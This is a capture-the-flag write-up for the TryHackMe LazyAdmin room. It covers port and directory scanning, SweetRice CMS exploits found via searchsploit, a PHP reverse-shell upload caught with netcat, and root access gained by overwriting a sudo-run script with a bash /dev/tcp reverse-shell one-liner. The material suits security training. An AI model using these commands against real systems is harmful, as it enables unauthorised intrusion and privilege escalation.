# LazyAdmin

**Room Link:** [https://tryhackme.com/room/lazyadmin](https://tryhackme.com/room/lazyadmin)



### Scanning

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

### TCP/80 - HTTP

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt 
```



<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
searchsploit sweet rice
searchsploit -m php/webapps/40718.txt
```

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

**Link:** [https://crackstation.net/](https://crackstation.net/)

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Tried to ssh with the credentials but it didn't work, went back to searchsploit because I saw a python script before but it needed credentials. I modified the script to take the input because I waa lazy.&#x20;

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
searchsploit sweet rice
searchsploit -m php/webapps/40716.py
python 40716.py
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

The php reverse shell setups up a reverse shell so I setup a nc listener on Kali and went to the URL the script mentioned.

<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1234
```

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

**Victim**

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

### **Privilege Escalation**

The user has access to run backup.pl without a password, I checked the the file and all it does is run a bash script. We have access to write to copy.sh so I changed it to a reverse shell one liner and setup my listener on Kali.

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 8080
```

**Victim**

```
echo "bash -c 'bash -i >& /dev/tcp/$KALI/8080 0>&1'"> copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>















